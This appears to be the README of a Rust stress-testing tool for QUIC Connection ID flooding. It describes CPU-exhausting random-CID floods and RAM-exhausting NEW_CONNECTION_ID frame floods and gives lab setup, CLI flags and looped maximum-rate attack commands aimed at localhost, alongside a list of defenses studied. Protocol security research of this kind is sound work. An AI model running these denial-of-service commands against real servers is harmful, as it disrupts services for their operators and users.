# quic-cid-flood-attack

> **Academic security research tool** for studying Connection ID (CID) Flooding vulnerabilities in the QUIC protocol (RFC 9000).

[![Rust](https://img.shields.io/badge/rust-1.75%2B-orange)](https://www.rust-lang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![RFC 9000](https://img.shields.io/badge/RFC-9000-green)](https://www.rfc-editor.org/rfc/rfc9000)
[![CI](https://github.com/Th3prof3ss0r/quic-cid-flood-attack/actions/workflows/ci.yml/badge.svg)](https://github.com/Th3prof3ss0r/quic-cid-flood-attack/actions/workflows/ci.yml)

---

## ⚠️ Ethical Use Statement

This tool was developed exclusively for **academic research and controlled laboratory environments**. Its use is restricted to:

- Isolated testbeds with no connection to public networks
- Authorized penetration testing engagements with written permission
- Academic research approved by an institutional ethics committee (IRB/CEP)
- Defensive security research and protocol hardening studies

**Unauthorized use against production systems or third-party infrastructure is illegal and strictly prohibited.** The authors assume no responsibility for misuse.

---

## Overview

`quic-cid-flood-attack` is a stress-testing tool that replicates two distinct attack vectors against QUIC servers:

| Vector | Target Resource | RFC Reference |
|--------|----------------|---------------|
| `raw`    | CPU / L1-L2 Cache (hash table exhaustion) | RFC 9000 §17.3 — Short Header Packets |
| `frames` | RAM (ID Reservation Attack)              | RFC 9000 §19.15 — NEW_CONNECTION_ID Frames |
| `both`   | CPU + RAM simultaneously                 | Combined |

### Why QUIC CID Flooding is significant

Unlike TCP — where a connection is identified by a 4-tuple (src IP, src port, dst IP, dst port) — QUIC uses a **Connection ID (CID)** to identify sessions. This enables connection migration (e.g., switching from Wi-Fi to 4G without dropping calls), but introduces a new attack surface:

- **Vector 1 (Raw):** An attacker floods the server with UDP packets containing random CIDs. Each lookup in the session hash table results in a cache miss, saturating CPU with O(n) lookups per packet.
- **Vector 2 (Frames):** An attacker establishes legitimate QUIC connections and repeatedly requests new CIDs via `NEW_CONNECTION_ID` frames. The server is **required by specification** to store these IDs, causing silent RAM exhaustion.

---

## Architecture

```
quic-cid-flood-lab/
├── src/
│   ├── main.rs              # CLI entrypoint, experiment orchestration
│   ├── lib.rs               # Public library exports
│   ├── config.rs            # TOML configuration parsing & validation
│   ├── attack/
│   │   ├── mod.rs
│   │   ├── raw_flood.rs     # Vector 1: UDP Short Header CID Flood
│   │   └── frame_flood.rs   # Vector 2: NEW_CONNECTION_ID Frame Flood
│   ├── metrics/
│   │   ├── mod.rs
│   │   ├── collector.rs     # Thread-safe real-time metrics (AtomicU64)
│   │   └── exporter.rs      # CSV export & terminal summary
│   └── utils/
│       ├── mod.rs
│       └── cid_gen.rs       # CID generation (random, sequential, fixed)
├── config/
│   └── lab.toml             # Experiment configuration template
├── tests/
│   └── integration_test.rs  # Integration tests
└── results/                 # CSV output directory (auto-created)
```

### Component Interaction

```
┌─────────────────────────────────────────────────┐
│                    main.rs                      │
│  CLI parse → config build → metrics init        │
│       │              │                          │
│       ▼              ▼                          │
│  run_raw_flood   run_frame_flood                │
│       │              │                          │
└───────┼──────────────┼──────────────────────────┘
        │              │
        ▼              ▼
┌──────────────┐  ┌──────────────────────────────┐
│ RawFloodWorker│  │ flood_single_connection      │
│ (OS threads) │  │ (tokio async tasks)          │
│              │  │                              │
│ UdpSocket    │  │ quinn::Endpoint              │
│ Short Header │  │ open_uni() per CID request   │
│ random CID   │  │ TLS 1.3 + ALPN h3            │
└──────┬───────┘  └──────────────┬───────────────┘
       │                         │
       ▼                         ▼
┌─────────────────────────────────────────────────┐
│              MetricsCollector                   │
│   AtomicU64: packets_sent, bytes_sent           │
│   Mutex<Vec<Sample>>: time-series snapshots     │
│   Background sampling loop (configurable ms)    │
└─────────────────────────────────────────────────┘
```

---

## Requirements

- Rust 1.75+ (`rustup install stable`)
- Linux or WSL2 (Windows Subsystem for Linux)
- Target: any QUIC/HTTP3-capable server (Caddy, nginx ≥1.25, lsquic)

---

## Installation

```bash
git clone https://github.com/Th3prof3ss0r/quic-cid-flood-attack.git
cd quic-cid-flood-attack
cargo build --release
```

Binary output: `./target/release/quic-cid-flood-attack`

---

## Setting Up the Test Server (Isolated Lab)

### Option A — Caddy (recommended for labs)

```bash
# Install Caddy
sudo apt install -y caddy

# Generate self-signed certificate
mkdir -p ~/lab-certs
openssl req -x509 -newkey rsa:2048 -keyout ~/lab-certs/key.pem \
  -out ~/lab-certs/cert.pem -days 365 -nodes \
  -subj "/CN=lab.target" \
  -addext "subjectAltName=IP:127.0.0.1,DNS:lab.target"

# Caddyfile
cat > ~/Caddyfile << 'EOF'
{
    admin 127.0.0.1:2019
    servers {
        protocols h1 h2 h3
    }
}
:443 {
    tls /root/lab-certs/cert.pem /root/lab-certs/key.pem
    respond /health "OK" 200
    respond /api "Hello QUIC" 200
    log {
        output file /var/log/caddy/lab.log
        format json
    }
}
EOF

sudo caddy run --config ~/Caddyfile
```

### Option B — nginx ≥ 1.25 with HTTP/3

```nginxh
server {
    listen 443 quic reuseport;
    listen 443 ssl;
    ssl_certificate     /root/lab-certs/cert.pem;
    ssl_certificate_key /root/lab-certs/key.pem;
    ssl_protocols       TLSv1.3;
    add_header Alt-Svc 'h3=":443"; ma=86400';
    location /health { return 200 "OK\n"; }
}
```

---

## Usage

### CLI Flags

```
USAGE:
    quic-cid-flood-attack [OPTIONS]

OPTIONS:
    --config <FILE>          TOML config file (overrides all flags)
    --target <IP:PORT>       Target QUIC server address
    --vector <VECTOR>        Attack vector: raw | frames | both  [default: raw]
    --workers <N>            Parallel worker threads for raw flood  [default: 4]
    --rate <PPS>             Packets/sec per worker; 0 = unlimited  [default: 10000]
    --duration <SECS>        Experiment duration in seconds  [default: 30]
    --cid-len <BYTES>        CID length in bytes [1-20]  [default: 20]
    --connections <N>        Parallel QUIC connections for frame flood  [default: 10]
    --ids-per-conn <N>       NEW_CONNECTION_ID frames per connection  [default: 100]
    --sample-ms <MS>         Metrics sampling interval  [default: 500]
    --output <FILE>          CSV output path  [default: results/experiment.csv]
```

### Examples

```bash
# Baseline measurement — low rate, raw vector
./target/release/quic-cid-flood-attack \
  --target 127.0.0.1:443 --vector raw \
  --workers 4 --rate 10000 --duration 30 \
  --output results/baseline.csv

# Raw CID Flood — CPU exhaustion
./target/release/quic-cid-flood-attack \
  --target 127.0.0.1:443 --vector raw \
  --workers 32 --rate 0 --duration 60 \
  --output results/raw_flood.csv

# Frame Flood — RAM exhaustion
./target/release/quic-cid-flood-attack \
  --target 127.0.0.1:443 --vector frames \
  --workers 16 --connections 500 --ids-per-conn 1000 \
  --rate 0 --duration 60 \
  --output results/frame_flood.csv

# Combined attack — maximum stress
./target/release/quic-cid-flood-attack \
  --target 127.0.0.1:443 --vector both \
  --workers 32 --connections 500 --ids-per-conn 1000 \
  --rate 0 --duration 120 \
  --output results/combined.csv
```

### Via TOML config file

```bash
./target/release/quic-cid-flood-attack --config config/lab.toml
```

---

## 3-Terminal Lab Protocol

**Terminal 1 — Server + live monitor**
```bash
caddy run --config ~/Caddyfile

# In another pane:
watch -n 1 'ps -p $(pgrep caddy) -o pid,pcpu,pmem,vsz,rss --no-headers'
```

**Terminal 2 — Raw CID Flood (CPU vector)**
```bash
while true; do
  ./target/release/quic-cid-flood-attack \
    --target 127.0.0.1:443 --vector raw \
    --workers 32 --rate 0 --duration 120 \
    --output results/raw_$(date +%s).csv
  sleep 2
done
```

**Terminal 3 — Frame Flood (RAM vector)**
```bash
while true; do
  ./target/release/quic-cid-flood-attack \
    --target 127.0.0.1:443 --vector frames \
    --workers 16 --connections 500 --ids-per-conn 1000 \
    --rate 0 --duration 120 \
    --output results/frame_$(date +%s).csv
  sleep 2
done
```

**Terminal 4 — Continuous data collection**
```bash
echo "timestamp,cpu,mem_mb,latency_ms" > results/monitoring.csv
while true; do
  TS=$(date +%T)
  STATS=$(ps -p $(pgrep caddy) -o pcpu,rss --no-headers | tr -s ' ')
  CPU=$(echo $STATS | cut -d' ' -f1)
  MEM=$(echo $STATS | awk '{printf "%.1f", $2/1024}')
  LAT=$(curl -sk -w "%{time_total}" https://127.0.0.1/health \
        -o /dev/null --max-time 2 | awk '{printf "%.0f", $1*1000}')
  echo "$TS,$CPU,$MEM,$LAT" | tee -a results/monitoring.csv
  sleep 2
done
```

---

## Output Format (CSV)

Each row is a time-series sample captured during the experiment:

| Field | Type | Description |
|-------|------|-------------|
| `timestamp` | ISO 8601 | Sample capture time (UTC) |
| `attack_vector` | string | `raw`, `frames`, or `both` |
| `packets_sent` | u64 | Cumulative packets sent |
| `bytes_sent` | u64 | Cumulative bytes sent |
| `active_connections` | u64 | Active QUIC connections (frame vector) |
| `response_latency_ms` | f64 | Server response latency (0 if not measured) |
| `cid_len` | usize | CID length used in this experiment |

---

## CID Generation Modes

| Function | Description | Use Case |
|----------|-------------|----------|
| `random_cid(len)` | Full entropy, 160-bit random | Simulates real attacker behavior |
| `sequential_cid(len, seq)` | Deterministic by sequence number | Reproducible experiments |
| `fixed_len_cid(len)` | All-zero CID | Baseline for strict-length defense testing |

---

## Defenses Studied

This tool supports testing the following mitigations (by observing their effect on attack throughput):

| Defense | How to test |
|---------|------------|
| Strict CID length filtering | Use `--cid-len` with values outside server's accepted range |
| Per-IP rate limiting | Observe throughput drop when server-side limits activate |
| Cuckoo hashing vs. chained hashing | Compare CPU usage across server implementations |
| NEW_CONNECTION_ID retirement limits | Monitor RAM stabilization under frame flood |

---

## Dependencies

| Crate | Version | Purpose |
|-------|---------|---------|
| `quinn` | 0.11 | QUIC protocol implementation |
| `rustls` | 0.23 | TLS 1.3 with `ring` crypto backend |
| `tokio` | 1.x | Async runtime for frame flood workers |
| `rand` | 0.8 | Cryptographic-quality CID generation |
| `clap` | 4.x | CLI argument parsing |
| `serde` + `toml` | — | TOML configuration deserialization |
| `csv` + `chrono` | — | Time-series metrics export |
| `tracing` | 0.1 | Structured experiment logging |

---

## License

MIT License — see [LICENSE](LICENSE) for details.

## Contributing

Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a pull request.

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for a full history of changes.

## Security

For responsible disclosure of vulnerabilities in this codebase, see [SECURITY.md](SECURITY.md).

---
